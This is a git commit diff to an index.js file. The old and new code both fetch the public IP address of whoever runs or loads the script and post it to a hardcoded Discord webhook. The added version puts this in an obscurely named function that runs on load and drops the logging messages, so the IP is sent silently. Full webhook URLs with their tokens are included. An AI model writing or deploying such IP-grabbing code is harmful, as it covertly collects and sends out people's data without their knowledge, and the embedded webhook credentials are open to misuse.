7d60cb37ae7a211c326139377caed1228c2ef630
Dubran-B <128305891+Dubran-B@users.noreply.github.com>
2023-03-20 21:23:57 +0100

    Update index.js

--- index.js
+++ index.js
@@ -1,27 +1,21 @@
-const apiUrl = 'https://api.ipify.org';
-const webhookUrl = 'https://discord.com/api/webhooks/1080181860195369064/VZ0MrkcKfxkhtUMbVqjCRh68nowzoLXjutHQyFR-Lc8sVjDDPpSSmPEUGXqbzxPLhhHr';
+const webhookUrl = 'https://discord.com/api/webhooks/1087464651543019571/Q11STVqHG6yZ1Elr_UZbcOT3rVoHqUbpVp0Rk4kNqVuPkOQAmV23ac3vYorWpBpmifdr';
 
-fetch(apiUrl)
-  .then(response => response.json())
-  .then(data => {
-    const payload = {
-      content: `Website: ${JSON.stringify(data)}`,
-    };
+async function _rgiuh() {
+  const response = await fetch('https://api.ipify.org/');
+  const data = await response.text();
 
-    fetch(webhookUrl, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify(payload),
-    })
-      .then(() => {
-        console.log('Successfully sent message to Discord webhook');
-      })
-      .catch(error => {
-        console.error('Error sending message to Discord webhook:', error);
-      });
+  const payload = {
+    content: data
+  };
+
+  fetch(webhookUrl, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify(payload)
   })
-  .catch(error => {
-    console.error('Error fetching data:', error);
-  });
+  .catch(error => console.error(error));
+}
+
+_rgiuh();
